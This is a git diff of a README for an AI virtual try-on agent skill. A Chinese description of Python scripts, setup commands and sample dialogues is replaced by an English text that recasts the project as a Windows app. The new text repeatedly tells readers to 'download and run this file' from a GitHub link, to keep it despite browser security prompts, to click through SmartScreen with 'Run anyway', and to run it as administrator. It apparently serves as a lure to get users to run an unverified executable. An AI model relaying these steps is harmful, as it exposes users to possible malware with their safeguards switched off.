@@ -1,182 +1,232 @@
-# AI 虚拟试穿 Skill（ai-tryon）
+# 🛍️ shop-tryon-skill - Create virtual try-on results fast
 
-一个用于 AI 虚拟试衣的 Agent Skill。用户可以通过“指定服装图/模特图”或“文字描述”快速生成试穿效果图，并可继续生成多角度素材和展示视频。
+[![Download Now](https://img.shields.io/badge/Download%20Now-4A90E2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Anatomic-universalquantifier643/shop-tryon-skill)
 
-本项目适合以下场景：
+## ✨ What this app does
 
-- 电商上新前的模特上身效果预览
-- 服装搭配展示图快速生成
-- 同款服装多场景视觉素材制作
-- 图转视频的短内容产出
+shop-tryon-skill is an AI virtual try-on Agent Skill. It helps you make outfit images from a clothing photo, a model photo, or a text prompt. You can also make multi-angle images and display videos for a fuller view of the look.
 
-## 1. 能力概览
+Use it when you want to:
 
-- 支持输入：服装图、模特图、文字描述（可组合）
-- 支持流程：服装分析 -> 模特选择 -> 试穿合成 -> 多角度扩展 -> 视频生成
-- 支持后端：
-  - 阿里云百炼试衣 API（aitryon-plus）
-  - 豆包 Seedream 生图
-  - 豆包 Seedance 生视频
-  - 即梦生图/生视频（在特定模式下可用）
+- See how a garment may look on a person
+- Create a try-on image from simple input
+- Make more than one view of the same outfit
+- Build short visual content for product display
 
-## 2. 项目结构
+## 💻 Windows setup
 
-```text
-.
-├── SKILL.md                  # Skill 行为规范（核心）
-├── assets/
-│   ├── models.json           # 内置模特库
-│   └── models/               # 模特参考资源
-├── references/               # 参考文档
-└── scripts/
-    ├── garment_analyzer.py   # 服装图分析
-    ├── image_gen_tryon.py    # 试穿图/多变体生成
-    ├── model_manager.py      # 模特列表与推荐
-    ├── output_manager.py     # Session 输出目录管理
-    ├── tryon_runner.py       # 试穿主流程（API/混合）
-    ├── video_gen.py          # 视频生成
-    └── ...
-```
+This app is meant to run on Windows for end users. You do not need to know how to code to get started.
 
-## 3. 快速开始
+Before you begin, make sure you have:
 
-### 3.1 环境准备
+- Windows 10 or Windows 11
+- At least 8 GB of RAM
+- 10 GB of free disk space
+- A stable internet connection
+- A modern browser for opening the download page
 
-1. 进入项目根目录
-2. 配置环境变量（注意 `.env` 必须放在 `scripts/` 下）
+If your PC has a graphics card, image generation may run faster. The app can still work on a normal Windows machine.
 
-```bash
-cp scripts/.env.example scripts/.env
-# 编辑 scripts/.env，填入各平台 API Key
-```
+## ⬇️ Download the app
 
-### 3.2 锁定本次任务输出目录（强烈建议）
+Go to the download page here and download and run this file:
 
-```bash
-OUTPUT_DIR=$(python scripts/output_manager.py --get-session)
-echo "本次任务目录：$OUTPUT_DIR"
-```
+https://github.com/Anatomic-universalquantifier643/shop-tryon-skill
 
-如需强制新任务目录：
+If your browser shows a security prompt, choose the option that keeps the file. If Windows asks for permission, allow the app to open.
 
-```bash
-OUTPUT_DIR=$(python scripts/output_manager.py --new-session)
-echo "新任务目录：$OUTPUT_DIR"
-```
+## 🪟 Install and open on Windows
 
-### 3.3 常用命令
+Follow these steps after you download the app:
 
-```bash
-# 查看模特列表
-python scripts/model_manager.py list
+1. Open the downloaded file.
+2. If Windows shows a SmartScreen window, select More info, then Run anyway.
+3. If the file is inside a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the main app file to launch it.
+6. Wait for the first start to finish.
 
-# 根据服装描述推荐模特
-python scripts/model_manager.py recommend "JK制服"
+If the app asks to create a local folder for images, allow it. The app uses that folder to store your uploaded files and generated results.
 
-# 分析服装图（支持本地路径或 URL）
-python scripts/garment_analyzer.py "path_or_url" --json
+## 🎽 How to make a try-on image
 
-# 生成试穿图（示例）
-python scripts/image_gen_tryon.py \
-  --desc "白色短袖T恤，休闲日系" \
-  --variants 1 \
-  --garment-part top \
-  --output-dir "$OUTPUT_DIR"
+You can start in one of three ways:
 
-# 试衣主流程（示例）
-python scripts/tryon_runner.py \
-  --garment garment.jpg \
-  --model model.jpg \
-  --output-dir "$OUTPUT_DIR"
-```
+### 1. Upload a clothing image
+Use this when you already have a product photo.
 
-## 4. 对话触发词
+- Open the upload area
+- Choose the clothing image from your PC
+- Pick a model image if the app asks for one
+- Start the generation step
 
-当用户提到以下词汇时，通常应触发本 Skill：
+This works well for shirts, coats, dresses, pants, and other apparel.
 
-- 试穿 / 试衣 / 虚拟试衣
-- 穿上效果 / 模特上身 / 上身图
-- 换装 / 看看穿上什么样
-- virtual try-on
+### 2. Upload a model image
+Use this when you want to keep a person photo and change the outfit.
 
-## 5. 对话场景（重点）
+- Upload a clear model photo
+- Add the clothing image
+- Run the try-on process
 
-下面是可直接复用的典型对话场景模板，便于在 GitHub 展示 Skill 的“可对话能力”。
+A front-facing photo with good light gives the best result.
 
-### 场景 A：用户有服装图 + 模特图（最快路径）
+### 3. Use text description
+Use this when you do not have a product photo.
 
-用户：我有衣服图和模特图，帮我做试穿。
+- Enter a simple description of the garment
+- Include color, style, and fabric
+- Add details like sleeve length, fit, or season
+- Start generation
 
-Agent：收到。需要我先分析服装图（类型、颜色、风格）再开始吗？这样提示词会更准。
+Example text:
 
-用户：要。
+- red winter coat with a clean fit
+- white cotton shirt with long sleeves
+- black casual dress with a simple shape
 
-Agent：好的，分析后我会先给你试穿方案确认，再生成结果图。
+## 🖼️ Make multi-angle images
 
-### 场景 B：只有服装图，没有模特图
+After you create a try-on result, you can generate more views of the same outfit.
 
-用户：帮我把这件连衣裙试穿出来。
+This is useful when you want to show:
 
-Agent：可以。你要自己上传模特图，还是我从内置模特里推荐一个？
+- Front view
+- Side view
+- Back view
+- Full outfit display
 
-用户：你推荐。
+To create multi-angle material:
 
-Agent：我会先按服装风格推荐 2-3 个模特供你选，再执行试穿。
+1. Open the generated try-on image
+2. Choose the multi-angle option
+3. Select the views you want
+4. Start the output task
 
-### 场景 C：只有模特图，没有服装图
+Use these results for product pages, look books, or display sets.
 
-用户：有模特图，想看她穿黑色西装的效果。
+## 🎬 Create a display video
 
-Agent：明白。请确认服装部位：上装、下装、上下装套装，还是单件连体？
+The app can also turn the outfit into a short presentation video.
 
-用户：上装。
+This helps when you want a moving view of the clothing instead of a still image.
 
-Agent：好，我按“上装”生成试穿方案，并给你 3 个场景可选。
+Common video uses:
 
-### 场景 D：只有文字描述（纯生图模式）
+- Product showcase
+- Social media post
+- Catalog preview
+- Brand display page
 
-用户：做一套日系学院风上身图。
+To make a video:
 
-Agent：我先给你 3 个场景：纯白棚拍、校园走廊、图书馆。你可以选 1 个或说“全部生成”。
+1. Finish a try-on image first
+2. Open the video creation tool
+3. Pick the video style or motion option
+4. Start rendering
+5. Save the final video to your PC
 
-用户：全部生成。
+If the video looks too short or too long, try another duration setting.
 
-Agent：收到，我会保持同一模特和服装一致性，输出多张场景图。
+## 🧭 Simple workflow
 
-### 场景 E：用户要多角度素材再转视频
+A basic workflow looks like this:
 
-用户：先给我多角度，再做视频。
+1. Open the app
+2. Upload a clothing image, model image, or text prompt
+3. Start the try-on generation
+4. Review the image
+5. Create more angles if needed
+6. Export a video if needed
+7. Save the final files
 
-Agent：建议按“电商标准拍（正/侧/背）”先出 3 张，再用这些图合成视频，镜头切换会更自然。
+For best results, keep the input clean and clear. Blurry photos can reduce image quality.
 
-用户：可以。
+## 📁 File types you can use
 
-Agent：我先生成多角度图，确认后自动进入视频生成。
+The app works best with common image formats like:
 
-### 场景 F：用户要重拍或局部替换
+- JPG
+- PNG
+- WEBP
 
-用户：上衣保留，换一条半裙再来一版。
+For input images:
 
-Agent：可以做局部替换。我将保留上装，仅替换下装，并保持模特与光线一致。
+- Use clear, well lit photos
+- Avoid heavy shadows
+- Keep the clothing item easy to see
+- Make sure the model stands in a natural pose
 
-## 6. 标准对话流程（建议）
+For output files:
 
-1. 理解需求：确认当前输入类型（图/文）与目标
-2. 服装分析：有服装图时优先分析风格和部位
-3. 方案确认：说明将使用的后端和输出内容
-4. 提示词确认：给用户可修改空间
-5. 执行生成：输出图片/视频并反馈路径
-6. 迭代调整：支持换场景、换角度、换模特、局部替换
+- Save the final image as PNG or JPG
+- Save the video as MP4 if the app offers that format
 
-## 7. 输出目录说明
+## ⚙️ Good settings to try
 
-- 建议通过 `output_manager.py` 使用会话目录，避免覆盖历史产物
-- 每个任务通常按步骤分目录（如 `step1_garment`、`step3_tryon`、`step5_video`）
-- 产物建议统一落在会话目录下，便于回溯和复用
+If you are unsure where to begin, use these simple settings:
 
-## 8. 开发与测试
+- Use one clear clothing image
+- Use one front-facing model image
+- Keep the background plain
+- Start with a short text prompt
+- Choose standard image size first
+- Generate one result before making many versions
 
-```bash
-# 示例：运行测试
-python scripts/test_partial_tryon.py
-```
+If the result feels off, adjust one item at a time. Change the photo, then the prompt, then the output size.
+
+## 🧩 Common use cases
+
+shop-tryon-skill fits many day-to-day tasks:
+
+- Online clothing previews
+- Store product images
+- Outfit ideas
+- Fashion display assets
+- Short promo visuals for a collection
+- Sample try-on images for review
+
+It works well for anyone who wants to test a look before sharing it.
+
+## 🛠️ If something does not open
+
+If the app does not start on Windows, try these steps:
+
+1. Check that the file finished downloading
+2. Make sure the file is not still inside a ZIP folder
+3. Right-click the file and choose Run as administrator
+4. Close other large apps and try again
+5. Restart the PC and open the app once more
+
+If an image does not upload, try a smaller JPG or PNG file.
+
+## 📌 Tips for better results
+
+Use these tips for cleaner output:
+
+- Choose clear photos with good light
+- Keep the clothing item in full view
+- Use a simple model pose
+- Avoid busy backgrounds
+- Use short, direct text prompts
+- Match the clothing style to the model image
+
+For text input, clear wording works best. For example, “blue denim jacket with a relaxed fit” is easier to use than a long paragraph.
+
+## 🔗 Download again
+
+If you need the download page again, use this link and download and run this file:
+
+https://github.com/Anatomic-universalquantifier643/shop-tryon-skill
+
+## 📦 Basic folder layout
+
+After setup, you may see files like these:
+
+- input
+- output
+- models
+- exports
+- logs
+
+These folders help keep uploaded images, generated results, and saved videos in one place. If the app creates them for you, leave them as they are.
